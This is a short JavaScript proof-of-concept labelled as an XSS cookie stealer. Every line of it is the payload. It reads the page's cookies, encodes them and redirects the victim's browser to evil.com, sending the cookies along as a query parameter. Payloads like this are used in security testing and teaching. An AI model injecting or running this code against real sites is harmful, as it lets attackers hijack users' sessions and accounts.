// XSS cookie stealer POC
var cookie = encodeURIComponent(document.cookie);
var url = 'https://evil.com/index.html/?victim_cookie=' + cookie;
window.location.href = url;
